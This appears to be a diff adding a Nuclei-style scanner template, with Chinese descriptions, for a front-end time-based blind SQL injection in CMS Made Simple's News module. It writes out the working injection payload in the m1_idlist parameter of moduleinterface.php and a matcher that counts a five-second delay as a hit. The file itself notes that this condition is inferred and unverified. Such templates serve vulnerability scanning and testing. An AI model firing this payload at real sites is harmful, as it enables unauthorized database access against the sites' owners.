@@ -1,0 +1,46 @@
+id: poc-cmf6whqe27bwyxxy
+info:
+  name: CMS Made Simple (CMSMS) 前台SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cmf6whqe27bwyxxy
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cmf6whqe27bwyxxy
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /moduleinterface.php?mact=News,m1_,default,0&m1_idlist=a,b,1,5))+and+(select+sleep(5))--+ HTTP/1.1
+
+
+    Accept: */*
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Connection: close
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
